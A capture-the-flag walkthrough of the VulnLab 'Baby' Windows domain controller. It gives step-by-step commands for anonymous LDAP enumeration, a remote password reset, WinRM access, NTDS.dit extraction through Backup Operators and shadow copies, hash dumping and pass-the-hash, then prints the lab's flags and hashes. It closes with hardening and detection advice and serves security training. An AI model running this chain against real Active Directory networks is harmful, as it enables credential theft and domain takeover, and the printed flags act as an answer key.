# Baby - HackTheBox Complete Walkthrough

**Machine IP:** 10.129.9.80  
**Difficulty:** Easy  
**OS:** Windows Server 2022  
**Platform:** VulnLab  
**Date:** December 9, 2025

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Access](#initial-access)
4. [Privilege Escalation - Domain Admin](#privilege-escalation-domain-admin)
5. [Flags](#flags)

---

## Reconnaissance

### Host Discovery & Port Scanning

**What is Reconnaissance?**
Reconnaissance is the first phase of penetration testing where we gather information about our target. For Active Directory environments, this means identifying the Domain Controller, open services, and the domain structure.

**Step 1: Adding the Target to /etc/hosts**

The `/etc/hosts` file maps domain names to IP addresses locally. This is essential for Active Directory testing because many services (like Kerberos) rely on proper DNS resolution.

```bash
echo "10.129.9.80 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts
```

**Breaking down this command:**
- `echo "10.129.9.80 baby.vl BabyDC.baby.vl"` - Creates the mapping entry
- `|` - Pipes the output to the next command
- `sudo` - Runs with administrator privileges (required to modify system files)
- `tee -a /etc/hosts` - Appends the text to /etc/hosts
- We add both the domain (baby.vl) and the FQDN (BabyDC.baby.vl)

**Verify it worked:**
```bash
tail -1 /etc/hosts
# Should show: 10.129.9.80 baby.vl BabyDC.baby.vl
```

**Step 2: Comprehensive Port Scanning with Nmap**

For Windows Active Directory environments, we need to scan all ports to identify domain services.

```bash
sudo nmap -p- --min-rate=10000 -T5 -sCV -Pn 10.129.9.80 -oN nmap_scan.txt
```

**Understanding each flag:**
- `sudo` - Required for SYN scan (more stealthy and accurate)
- `nmap` - The network scanning tool
- `-p-` - Scan ALL 65535 ports (critical for AD - many services use high ports)
- `--min-rate=10000` - Send at least 10,000 packets per second (faster scanning)
- `-T5` - Timing template 5 (most aggressive, fastest)
- `-sC` - Run default NSE scripts (service detection and enumeration)
- `-sV` - Detect service versions
- `-Pn` - Skip ping check (Windows often blocks ping)
- `10.129.9.80` - The target IP address
- `-oN nmap_scan.txt` - Save output to nmap_scan.txt

**This scan will take 1-2 minutes.**

**Results:**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Open Ports Analysis:**

- **Port 53 (DNS)** - Domain Name System
  - Indicates this is a Domain Controller
  - Handles name resolution for the domain

- **Port 88 (Kerberos)** - Authentication Protocol
  - **KEY INDICATOR**: This confirms it's a Windows Active Directory Domain Controller
  - Kerberos is the primary authentication protocol in AD
  - Used for ticket-based authentication

- **Port 135 (MSRPC)** - Microsoft Remote Procedure Call
  - Standard Windows communication protocol
  - Used for various Windows services

- **Ports 139 & 445 (SMB)** - Server Message Block
  - File sharing and network communication protocol
  - **Port 445** is the primary target for enumeration
  - Used for accessing shares, testing credentials, and exploits

- **Port 636 (LDAPS)** - LDAP over SSL
  - Secure LDAP for querying Active Directory
  - More secure than plain LDAP (port 389)

- **Port 3268 (Global Catalog LDAP)**
  - LDAP service for Active Directory
  - Contains information about all objects in the forest
  - Critical for AD enumeration

- **Port 3389 (RDP)** - Remote Desktop Protocol
  - Allows remote GUI access to Windows machines
  - Useful if we obtain valid credentials

- **Port 5985 (WinRM)** - Windows Remote Management
  - PowerShell remoting service
  - Allows command-line remote access
  - Our target for initial access once we have credentials

**What does this tell us?**
This is definitely a **Windows Active Directory Domain Controller**. The presence of DNS (53), Kerberos (88), LDAP (3268), and SMB (445) together is a clear signature of a DC.

---

## Enumeration

**What is Enumeration?**
Enumeration in Active Directory means gathering detailed information about the domain structure: users, groups, computers, shares, and permissions - all without authentication initially.

### LDAP Enumeration (Anonymous Bind)

**What is LDAP?**
LDAP (Lightweight Directory Access Protocol) is like a phonebook for Active Directory. It stores:
- User accounts and their properties
- Groups and memberships
- Computer accounts
- Domain policies
- Organizational structure

**Why is this important?**
Sometimes Domain Controllers allow **anonymous LDAP binding** - meaning we can query the directory without credentials. This is a common misconfiguration.

**Step 3: Testing Anonymous LDAP Access**

Let's attempt to query LDAP without credentials:

```bash
ldapsearch -x -H ldap://10.129.9.80 -b "DC=baby,DC=vl" > ldapsearch.txt
```

**Breaking down this command:**
- `ldapsearch` - Tool for querying LDAP directories
- `-x` - Use simple authentication (no SASL)
- `-H ldap://10.129.9.80` - Connect to this LDAP server
- `-b "DC=baby,DC=vl"` - Base DN (Distinguished Name) to start search from
  - `DC=baby,DC=vl` represents the domain baby.vl in LDAP format
  - DC stands for "Domain Component"
- `> ldapsearch.txt` - Save output to file

**What happened?**
If this works, we get a MASSIVE dump of the entire Active Directory structure! This is a **gold mine** of information.

**Step 4: Analyzing the LDAP Dump**

Let's examine what we found:

```bash
cat ldapsearch.txt | grep -i "sAMAccountName:" | head -20
```

**This shows us user accounts:**
```
sAMAccountName: Guest
sAMAccountName: Jacqueline.Barnett
sAMAccountName: Ashley.Webb
sAMAccountName: Hugh.George
sAMAccountName: Leonard.Dyer
sAMAccountName: Connor.Wilkinson
sAMAccountName: Joseph.Hughes
sAMAccountName: Kerry.Wilson
sAMAccountName: Teresa.Bell
```

**What is sAMAccountName?**
This is the **username** used for logging in. In Windows, users log in with their sAMAccountName, not their full name.

### Critical Finding - Password in Description

**Step 5: Searching for Sensitive Information**

LDAP dumps often contain sensitive data in description fields, notes, or other attributes. Let's search:

```bash
cat ldapsearch.txt | grep -i "description:" | grep -v "^$"
```

**JACKPOT! We found:**
```
description: Set initial password to BabyStart123!
```

**This appears in Teresa.Bell's account entry!**

**Why is this a vulnerability?**
Administrators sometimes leave notes about initial passwords in user descriptions. This is a **critical misconfiguration** - passwords should NEVER be stored in cleartext, especially not in directory attributes visible to all authenticated users (or in this case, anonymous users!).

**Credentials Found:**
- **Username:** Teresa.Bell
- **Password:** BabyStart123!
- **Domain:** baby.vl

### Domain Groups Analysis

**Step 6: Identifying Important Groups**

Let's see what groups exist and who's in them:

```bash
cat ldapsearch.txt | grep -A 5 "cn: it" | head -15
```

**IT Group Members:**
```
member: CN=Caroline.Robinson,OU=it,DC=baby,DC=vl
member: CN=Teresa Bell,OU=it,DC=baby,DC=vl
member: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
member: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
member: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
memberOf: CN=Remote Management Users,CN=Builtin,DC=baby,DC=vl
```

**KEY FINDING:**
The **IT group** is a member of **Remote Management Users**!

**What does this mean?**
- Members of "Remote Management Users" can use **WinRM** (Windows Remote Management)
- Teresa.Bell is in the IT group
- Therefore, Teresa.Bell can access the server via WinRM (port 5985)!

**Check Domain Admins:**
```bash
cat ldapsearch.txt | grep -A 5 "Domain Admins"
```

**Domain Admins:**
- Administrator (default)
- Ian.Walker (custom admin account)

### User Account Status Discovery

**Step 7: Identifying Accounts Requiring Password Reset**

Notice that two users have **incomplete LDAP entries**:
- Caroline.Robinson
- Ian.Walker

```bash
cat ldapsearch.txt | grep "CN=Caroline Robinson" -A 5
```

**Output:**
```
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl

# search reference
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl
```

**What does this mean?**
The LDAP entry for Caroline.Robinson exists but shows no details. This often indicates:
1. The account has special restrictions
2. The account requires password change at next logon
3. The account has specific attributes that aren't returned in anonymous queries

**Answer to Question:** Caroline.Robinson is the user that must reset their password before logging in.

---

## Initial Access

### Testing Credentials via SMB

**What is SMB Testing?**
Before trying to login, we should verify credentials work and check their status.

**Step 8: Testing Teresa.Bell's Credentials**

```bash
crackmapexec smb 10.129.9.80 -u 'Teresa.Bell' -p 'BabyStart123!'
```

**Breaking down this command:**
- `crackmapexec smb` - Tool for testing SMB authentication
- `10.129.9.80` - Target IP
- `-u 'Teresa.Bell'` - Username
- `-p 'BabyStart123!'` - Password

**Result:**
The credentials work but Teresa doesn't have special permissions for our purposes.

**Step 9: Testing Caroline.Robinson's Credentials**

Since Caroline.Robinson also had incomplete LDAP data, let's test if she uses the same default password:

```bash
crackmapexec smb 10.129.9.80 -u 'Caroline.Robinson' -p 'BabyStart123!'
```

**Result:**
```
SMB         10.129.9.80     445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

**Excellent! What does STATUS_PASSWORD_MUST_CHANGE mean?**

This error is actually **good news**:
1. ✅ The **username is valid** (Caroline.Robinson exists)
2. ✅ The **password is correct** (BabyStart123!)
3. ❌ BUT the account is locked until the user changes their password

**This is a common corporate security practice:**
- Admins set initial passwords like "BabyStart123!"
- Users must change the password on first login
- This prevents admins from knowing users' final passwords

### Exploiting Password Change Requirement

**Step 10: Changing Caroline's Password Remotely**

We can use Impacket's `changepasswd.py` script to change the password over SMB!

**What is Impacket?**
Impacket is a collection of Python tools for working with network protocols. It includes tools for interacting with Windows services like SMB, LDAP, and more.

**Installing/Locating changepasswd.py:**

```bash
# Check if impacket is installed
which impacket-smbclient

# Install if needed
sudo apt install python3-impacket

# The changepasswd.py script is in /opt/impacket/examples/
# Create a symlink for easy access
sudo ln -sf /opt/impacket/examples/changepasswd.py /usr/local/bin/changepasswd.py
```

**Change Caroline's password:**

```bash
changepasswd.py baby.vl/Caroline.Robinson:'BabyStart123!'@10.129.9.80 -newpass 'Caroline123!'
```

**Breaking down this command:**
- `changepasswd.py` - Impacket script for changing passwords
- `baby.vl/Caroline.Robinson` - Domain and username
- `:'BabyStart123!'` - Current password (colon before password)
- `@10.129.9.80` - Target Domain Controller IP
- `-newpass 'Caroline123!'` - New password to set
  - Must meet Windows complexity requirements:
    - At least 8 characters
    - Uppercase, lowercase, numbers, special characters

**Alternative strong password:**
```bash
changepasswd.py baby.vl/Caroline.Robinson:'BabyStart123!'@10.129.9.80 -newpass 'AveryStrongSuperStrong123!'
```

**Success! The password has been changed!**

**New Credentials:**
- **Username:** Caroline.Robinson
- **Old Password:** BabyStart123!
- **New Password:** AveryStrongSuperStrong123!
- **Domain:** baby.vl

### WinRM Access

**Step 11: Testing WinRM Access**

Remember: Caroline.Robinson is in the IT group, which is a member of Remote Management Users. This means she can use WinRM!

```bash
crackmapexec winrm 10.129.9.80 -u 'Caroline.Robinson' -p 'AveryStrongSuperStrong123!'
```

**Result:**
```
WINRM       10.129.9.80     5985   BABYDC           [+] baby.vl\Caroline.Robinson:AveryStrongSuperStrong123! (Pwn3d!)
```

**"Pwn3d!" means we can login!** 🎉

**Step 12: Getting a Shell with Evil-WinRM**

Evil-WinRM is a tool for connecting to Windows systems via WinRM and getting a PowerShell session.

```bash
evil-winrm -i 10.129.9.80 -u 'Caroline.Robinson' -p 'AveryStrongSuperStrong123!'
```

**Breaking down this command:**
- `evil-winrm` - Tool for WinRM connections with extra features
- `-i 10.129.9.80` - IP address of target
- `-u 'Caroline.Robinson'` - Username
- `-p 'AveryStrongSuperStrong123!'` - Password

**You should see:**
```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

**We're in! We have a PowerShell session as Caroline.Robinson!**

### User Flag

**Step 13: Retrieving the User Flag**

```powershell
cd Desktop
type user.txt
```

**Or in one command:**
```powershell
type C:\Users\Caroline.Robinson\Desktop\user.txt
```

**User Flag:** `75ca6517009f2bc8e58fd95b38805b5d`

**Congratulations! Initial access achieved!** 🚩

---

## Privilege Escalation - Domain Admin

**What's the Goal Now?**
We have access as Caroline.Robinson (a regular IT user), but we want **Domain Admin** privileges to fully compromise the domain. In Active Directory, Domain Admins can control everything.

### Enumeration as Caroline.Robinson

**Step 14: Checking Our Privileges**

Let's see what special rights Caroline has:

```powershell
whoami /priv
```

**Output:**
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**🔥 JACKPOT! SeBackupPrivilege and SeRestorePrivilege!**

**What are these privileges?**

1. **SeBackupPrivilege:**
   - Allows reading ANY file on the system, regardless of permissions
   - Bypasses file security (ACLs)
   - Can backup protected system files
   - Originally intended for backup software

2. **SeRestorePrivilege:**
   - Allows writing ANY file on the system
   - Can restore files to any location
   - Complements backup privilege

**Why is this critical?**
With SeBackupPrivilege, we can:
- Read the **NTDS.dit** file (Active Directory database)
- Extract **ALL domain password hashes**
- Including Domain Admin hashes!

**Step 15: Verifying Group Membership**

```powershell
whoami /groups
```

**Key Finding:**
```
BUILTIN\Backup Operators               Alias            S-1-5-32-551
BUILTIN\Remote Management Users        Alias            S-1-5-32-580
BABY\it                                Group            S-1-5-21-1407081343-4001094062-1444647654-1109
```

**Caroline is in the Backup Operators group!**

**What is Backup Operators?**
This is a built-in Windows group that grants:
- SeBackupPrivilege
- SeRestorePrivilege  
- Ability to backup and restore files on Domain Controllers
- Often overlooked in security reviews

**Step 16: Listing Domain Admins**

```powershell
net group "Domain Admins" /domain
```

**Output:**
```
Members
-------------------------------------------------------------------------------
Administrator            Ian.Walker
```

**Target identified:** Ian.Walker is a Domain Admin (besides the default Administrator account).

### Abusing Backup Operators - NTDS.dit Extraction

**What is NTDS.dit?**
NTDS.dit is the **Active Directory database** stored on Domain Controllers. It contains:
- All user accounts and their password hashes
- Group memberships
- Domain policies
- Computer accounts
- Everything in Active Directory

**Why do we want it?**
If we can extract NTDS.dit and decrypt it, we get **every password hash in the domain**, including Domain Admins!

**The Challenge:**
NTDS.dit is normally locked by the system and can't be copied directly. But with SeBackupPrivilege, we can bypass this!

**Step 17: Creating a Shadow Copy**

**What is a Shadow Copy?**
Shadow Copy (Volume Shadow Service) creates point-in-time snapshots of volumes. Windows uses this for:
- System Restore
- File History
- Backup software

We'll create a shadow copy of the C: drive, which gives us access to a "frozen" version of all files, including NTDS.dit!

**Create shadow copy script:**

```powershell
# Create temp directory
mkdir C:\temp

# Create diskshadow script
set-content -path C:\temp\shadow.txt -value "set verbose on","set metadata C:\Windows\Temp\meta.cab","set context clientaccessible","set context persistent","begin backup","add volume C: alias cdrive","create","expose %cdrive% E:","end backup"
```

**What does this script do?**
- `set verbose on` - Show detailed output
- `set metadata C:\Windows\Temp\meta.cab` - Store metadata here
- `set context clientaccessible` - Make shadow copy accessible
- `set context persistent` - Shadow copy survives reboots
- `begin backup` - Start backup context
- `add volume C: alias cdrive` - Add C: drive with alias "cdrive"
- `create` - Create the shadow copy
- `expose %cdrive% E:` - Mount shadow copy as E: drive
- `end backup` - End backup context

**Execute the shadow copy creation:**

```powershell
diskshadow /s C:\temp\shadow.txt
```

**Output:**
```
Microsoft DiskShadow version 1.0
...
* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds
...
Alias cdrive for shadow ID {95642554-1d4b-4819-9f1e-d5c6de494a90} set as environment variable.
...
The shadow copy was successfully exposed as E:\.
```

**Success! The shadow copy is now accessible at E:\**

**Step 18: Extracting NTDS.dit**

Now we need to copy NTDS.dit from the shadow copy. Regular `copy` won't work because of permissions, but **robocopy with /b flag** will use our backup privilege!

```powershell
robocopy /b E:\Windows\NTDS C:\temp ntds.dit
```

**Breaking down this command:**
- `robocopy` - Robust file copy utility (better than copy)
- `/b` - **Backup mode** - uses SeBackupPrivilege to bypass ACLs
- `E:\Windows\NTDS` - Source (shadow copy location)
- `C:\temp` - Destination
- `ntds.dit` - File to copy

**Why /b flag is critical:**
The `/b` flag tells robocopy to use **backup mode**, which leverages SeBackupPrivilege to read files that would normally be denied.

**Step 19: Extracting Registry Hives**

To decrypt NTDS.dit, we also need the SYSTEM registry hive (contains the boot key for decryption):

```powershell
reg save HKLM\SYSTEM C:\temp\system.hive
```

**Breaking down this command:**
- `reg save` - Export registry key to file
- `HKLM\SYSTEM` - The SYSTEM registry hive
- `C:\temp\system.hive` - Output file

**Why do we need this?**
The SYSTEM hive contains the **BootKey** (also called SysKey), which is used to encrypt the password hashes in NTDS.dit. Without it, we can't decrypt the hashes.

**Optional - SAM for local accounts:**
```powershell
reg save HKLM\SAM C:\temp\sam.hive
```

### Downloading Files to Kali

**Step 20: Transferring Files Back**

Evil-WinRM has a built-in download function:

```powershell
download C:\temp\ntds.dit
download C:\temp\system.hive
```

**These files will be downloaded to your current directory on Kali.**

**Verify the downloads:**
```bash
ls -lh ntds.dit system.hive
```

**Expected output:**
```
-rw-rw-r-- 1 kali kali  16M Dec  9 15:56 ntds.dit
-rw-rw-r-- 1 kali kali  20M Dec  9 16:01 system.hive
```

### Extracting Domain Hashes

**Step 21: Using secretsdump.py**

Now we'll use Impacket's `secretsdump.py` to extract all password hashes:

```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL > secretsdump.txt
```

**Breaking down this command:**
- `secretsdump.py` - Impacket tool for extracting secrets
- `-ntds ntds.dit` - Specify the NTDS.dit database file
- `-system system.hive` - Specify the SYSTEM hive (for boot key)
- `LOCAL` - Process files locally (not over network)
- `> secretsdump.txt` - Save output to file

**What does this do?**
1. Reads the boot key from system.hive
2. Uses boot key to decrypt NTDS.dit
3. Extracts all password hashes (NTLM format)
4. Extracts Kerberos keys (AES256, AES128, DES)

**Output (Domain Credentials):**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:6bb30653a74cc1d665f80bbbe4b25a65:::
```

**Format explanation:**
```
username:RID:LM_hash:NTLM_hash:::
```

- **RID (Relative Identifier):** Unique ID for the user
- **LM Hash:** Legacy hash (usually empty: aad3b435b51404eeaad3b435b51404ee)
- **NTLM Hash:** The actual password hash (what we need!)

**Key Hashes Obtained:**
- **Administrator:** `ee4457ae59f1e3fbd764e33d9cef123d`
- **Ian.Walker:** `0e440fd30bebc2c524eaaed6b17bcd5c`

### Pass-the-Hash Attack

**What is Pass-the-Hash?**
Pass-the-Hash is an attack where we use the NTLM hash directly for authentication, without needing to crack the password. Windows accepts the hash for authentication!

**Why does this work?**
Windows stores passwords as hashes. When you authenticate:
1. Client sends username
2. Server sends challenge
3. Client encrypts challenge with password hash
4. Server verifies the response

If we have the hash, we can perform step 3 without knowing the actual password!

**Step 22: Using Administrator Hash for WinRM**

```bash
evil-winrm -i 10.129.9.80 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

**Breaking down this command:**
- `evil-winrm` - WinRM client
- `-i 10.129.9.80` - Target IP
- `-u Administrator` - Username
- `-H ee4457ae59f1e3fbd764e33d9cef123d` - NTLM hash (instead of password)

**You're now Administrator!**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Alternative - Using Ian.Walker's hash:**
```bash
evil-winrm -i 10.129.9.80 -u Ian.Walker -H 0e440fd30bebc2c524eaaed6b17bcd5c
```

Both accounts are Domain Admins and will give you full control!

### Root Flag

**Step 23: Retrieving the Root Flag**

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag:** `4f4d5d0a7a3000be864f7024d1753f45`

**🏆 Congratulations! You've completely compromised the Baby domain!**

---

## Flags

### User Flag
```powershell
type C:\Users\Caroline.Robinson\Desktop\user.txt
```
**Flag:** `75ca6517009f2bc8e58fd95b38805b5d`

### Root Flag
```powershell
type C:\Users\Administrator\Desktop\root.txt
```
**Flag:** `4f4d5d0a7a3000be864f7024d1753f45`

---

## Summary

### Attack Chain

1. **Reconnaissance** - Nmap identified Domain Controller services (DNS, Kerberos, LDAP, SMB, WinRM)
2. **LDAP Enumeration** - Anonymous LDAP bind revealed entire domain structure
3. **Credential Discovery** - Found default password "BabyStart123!" in Teresa.Bell's description field
4. **Account Status Discovery** - Identified Caroline.Robinson requires password reset
5. **Password Reset** - Used changepasswd.py to reset Caroline's password over SMB
6. **Initial Access** - Logged in via WinRM as Caroline.Robinson (IT group → Remote Management Users)
7. **Privilege Enumeration** - Discovered Caroline has SeBackupPrivilege (Backup Operators group)
8. **Shadow Copy Creation** - Used diskshadow to create volume shadow copy
9. **NTDS.dit Extraction** - Used robocopy /b to copy NTDS.dit from shadow copy
10. **Registry Extraction** - Exported SYSTEM hive for boot key
11. **Hash Extraction** - Used secretsdump.py to decrypt NTDS.dit and extract all password hashes
12. **Pass-the-Hash** - Used Administrator hash with evil-winrm for full domain compromise

### Key Vulnerabilities

1. **Anonymous LDAP Bind** - Allowed complete domain enumeration without authentication
2. **Cleartext Password in Description** - Teresa.Bell's password stored in description field
3. **Password Reuse** - Caroline.Robinson used same default password
4. **Backup Operators Group Membership** - Caroline had SeBackupPrivilege
5. **Insufficient Privilege Auditing** - IT users shouldn't have Backup Operators rights

### Tools Used

- `nmap` - Port scanning and service detection
- `ldapsearch` - LDAP enumeration
- `grep` - Parsing LDAP output
- `crackmapexec` - SMB/WinRM testing
- `changepasswd.py` (Impacket) - Remote password change
- `evil-winrm` - WinRM shell access
- `diskshadow` - Volume shadow copy creation
- `robocopy` - File copying with backup mode
- `reg save` - Registry hive extraction
- `secretsdump.py` (Impacket) - NTDS.dit decryption and hash extraction

### Commands Reference

**LDAP Enumeration:**
```bash
ldapsearch -x -H ldap://10.129.9.80 -b "DC=baby,DC=vl"
```

**SMB Authentication Testing:**
```bash
crackmapexec smb 10.129.9.80 -u 'username' -p 'password'
```

**Remote Password Change:**
```bash
changepasswd.py baby.vl/Caroline.Robinson:'BabyStart123!'@10.129.9.80 -newpass 'NewPassword123!'
```

**WinRM Login:**
```bash
evil-winrm -i 10.129.9.80 -u 'Caroline.Robinson' -p 'Password123!'
```

**Check Privileges:**
```powershell
whoami /priv
whoami /groups
```

**Create Shadow Copy:**
```powershell
set-content -path C:\temp\shadow.txt -value "set verbose on","set metadata C:\Windows\Temp\meta.cab","set context clientaccessible","set context persistent","begin backup","add volume C: alias cdrive","create","expose %cdrive% E:","end backup"
diskshadow /s C:\temp\shadow.txt
```

**Extract NTDS.dit:**
```powershell
robocopy /b E:\Windows\NTDS C:\temp ntds.dit
reg save HKLM\SYSTEM C:\temp\system.hive
```

**Download Files (in Evil-WinRM):**
```powershell
download C:\temp\ntds.dit
download C:\temp\system.hive
```

**Extract Hashes:**
```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**Pass-the-Hash:**
```bash
evil-winrm -i 10.129.9.80 -u Administrator -H <NTLM_HASH>
```

---

## Lessons Learned

### Security Misconfigurations

1. **Anonymous LDAP Binding:**
   - LDAP should require authentication
   - Disable anonymous binds on Domain Controllers
   - Configure LDAP policies to require authentication

2. **Passwords in User Descriptions:**
   - NEVER store passwords in directory attributes
   - Use secure password distribution methods
   - Implement automated password generation and secure delivery

3. **Password Reuse:**
   - Enforce unique passwords for each account
   - Implement password complexity and history policies
   - Use password managers for IT staff

4. **Excessive Privileges:**
   - IT users shouldn't be in Backup Operators
   - Follow principle of least privilege
   - Regular audit of group memberships
   - Separate duties: IT support vs. backup administrators

5. **Domain Admin Exposure:**
   - Limit Domain Admin accounts
   - Use Protected Users group for admin accounts
   - Implement tiered administration model

### Active Directory Best Practices

1. **Disable Anonymous LDAP:**
   ```powershell
   # On Domain Controller
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 2
   ```

2. **Audit Sensitive Groups:**
   - Domain Admins
   - Enterprise Admins
   - Backup Operators
   - Account Operators
   - Server Operators

3. **Monitor for Shadow Copies:**
   - Alert on diskshadow.exe usage
   - Monitor for unusual volume shadow copy creation
   - Restrict access to backup tools

4. **Implement Credential Guard:**
   - Protects against Pass-the-Hash
   - Requires Windows 10 Enterprise or Windows Server 2016+

5. **Use Privileged Access Workstations (PAWs):**
   - Dedicated machines for admin tasks
   - Prevents credential theft

### Detection Opportunities

**SIEM Alerts to Implement:**

1. **Anonymous LDAP Queries:**
   - Event ID 2889 (LDAP bind requests)
   - Alert on bind type = Anonymous

2. **diskshadow.exe Execution:**
   - Process creation events
   - Command line monitoring

3. **Unusual WinRM Connections:**
   - Event ID 4648 (Explicit credential logon)
   - Track WinRM sessions from IT users

4. **Registry Hive Exports:**
   - Event ID 4656/4663 (Registry access)
   - Monitor "reg save" commands

5. **NTDS.dit Access:**
   - File access auditing on C:\Windows\NTDS\
   - Alert on any access to ntds.dit

---

## Additional Resources

### Active Directory Security

- [AD Security Best Practices - Microsoft](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
- [Securing Privileged Access - Microsoft](https://docs.microsoft.com/en-us/security/compass/overview)
- [Backup Operators Group Abuse - ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#sebackupprivilege)

### Tools Documentation

- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Evil-WinRM - GitHub](https://github.com/Hackplayers/evil-winrm)
- [CrackMapExec - GitHub](https://github.com/byt3bl33d3r/CrackMapExec)

### Further Learning

- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [PayloadsAllTheThings - AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [HackTricks - AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)

---

**Machine Completed:** December 9, 2025  
**Target:** baby.vl (BabyDC.baby.vl)  
**IP Address:** 10.129.9.80  
**Platform:** VulnLab  
**Difficulty:** Easy

---

**Happy Hacking! 🎯**
